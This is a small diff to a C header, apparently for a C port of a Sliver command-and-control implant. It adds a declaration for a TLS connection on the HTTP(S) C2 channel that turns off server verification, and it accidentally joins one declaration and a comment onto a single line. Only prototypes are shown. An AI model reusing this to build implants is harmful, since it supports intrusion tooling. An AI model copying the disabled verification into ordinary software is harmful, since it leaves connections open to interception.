@@ -23,9 +23,14 @@ int sliver_tls_connect(sliver_tls_t **out, const char *host, uint16_t port,
                        const char *ca_pem, const char *cert_pem, const char *key_pem,
                        char *err, size_t err_len);
 
+/* TLS for the HTTP(S) C2 channel: no client certificate and no server
+ * verification, matching Sliver's Go implant (InsecureSkipVerify for the HTTP
+ * layer; envelope signatures carry the authentication). Accepts TLS 1.2+. */
+int sliver_tls_connect_plain(sliver_tls_t **out, const char *host, uint16_t port,
+                             char *err, size_t err_len);
+
 /* Returns bytes written, or -1. */
-long sliver_tls_write(sliver_tls_t *conn, const void *buf, size_t len);
-/* Returns bytes read (>0), 0 on clean EOF, or -1. */
+long sliver_tls_write(sliver_tls_t *conn, const void *buf, size_t len);/* Returns bytes read (>0), 0 on clean EOF, or -1. */
 long sliver_tls_read(sliver_tls_t *conn, void *buf, size_t len);
 /* Returns the negotiated protocol version string ("TLSv1.3"). */
 const char *sliver_tls_version(sliver_tls_t *conn);
